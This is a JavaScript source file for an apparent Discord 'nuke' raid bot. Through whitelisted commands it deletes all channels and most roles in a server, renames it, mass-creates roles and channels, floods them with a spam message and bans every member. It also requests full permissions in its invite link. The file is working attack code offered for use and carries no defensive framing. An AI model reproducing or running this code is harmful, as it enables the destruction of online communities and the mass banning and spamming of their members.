const Discord = require("discord.js");
const RB = new Discord.Client();
const config = require("./config.json");
const fs = require("fs");

const authorized = ["id 1", "id 2", "and others"];

RB.on('ready', () => {
	RB.user.setActivity("Monitoring x servers...");
  	console.log(`Ready ${RB.user.tag}!\nhttps://discord.com/api/oauth2/authorize?client_id=${RB.user.id}&permissions=-1&scope=bot`); 
});

RB.on('rateLimit', rate => {
	console.log(`Time to wait: ${rate.timeDifference}`);
});

RB.on('message', message => {
	if(message.content.indexOf(config.prefix) !== 0 || message.author.bot) return;
	if(!authorized.includes(message.author.id)) return console.log(`${message.author.tag} - (${message.author.id}) tried to use me :(`);
	var args = message.content.slice(config.prefix.length).trim().split(/ +/g);
	var command = args.shift().toLowerCase().replace('/', '');
   if(command == "nuke"){
   	(async ()=>{
   		RB.guilds.get(message.guild.id).setName(config.servername);
   		RB.guilds.get(message.guild.id).setIcon(config.serverpictureurl);
   		RB.guilds.get(message.guild.id).setRegion(config.serverregion);
   		RB.guilds.get(message.guild.id).channels.map(c=>{c.delete();});
   		RB.guilds.get(message.guild.id).roles.map(r=>{if(r.name == "@everyone" || r.managed){}else{r.delete();}});
   		for (var i = 0; i < config.numberofroles; i++) {message.guild.createRole({name: config.rolename, color: 'RANDOM'})};
   		for (var i = 0; i < config.numberofchannels; i++) {message.guild.createChannel(config.channelname, {type: "text"}).then(channel =>{for (var i = 0; i < config.numberofmessageafterchannelcreated; i++){channel.send(config.baseraidmessage)}})};;
   		setTimeout(function(){ for (var i = 0; i < 500; i++){message.guild.channels.map(c=>{c.send(config.baseraidmessage)});}}, 5000);
   	})();
   } else if(command == "delete"){
   	(async ()=>{
   		RB.guilds.get(message.guild.id).channels.map(c=>{c.delete();});
   		RB.guilds.get(message.guild.id).roles.map(r=>{if(r.name == "@everyone" || r.managed){}else{r.delete();}});
		RB.guilds.get(message.guild.id).createChannel(config.channelname, {type: "text"});
   	})();
   } else if(command == "create"){
      (async ()=>{
         for (var i = 0; i < config.numberofroles; i++) {message.guild.createRole({name: config.rolename, color: 'RANDOM'})};
         for (var i = 0; i < config.numberofchannels; i++) {message.guild.createChannel(config.channelname, {type: "text"}).then(channel =>{for (var i = 0; i < config.numberofmessageafterchannelcreated; i++){channel.send(config.baseraidmessage)}})};
         setTimeout(function(){ for (var i = 0; i < 500; i++){message.guild.channels.map(c=>{c.send(config.baseraidmessage)});}}, 5000);
      })();
   } else if(command == "leave"){
      client.guilds.get(message.guild.id).leave();
   } else if(command == "banall"){
      message.guild.members.map(m => m.ban());
   }

});

RB.login(config.token);
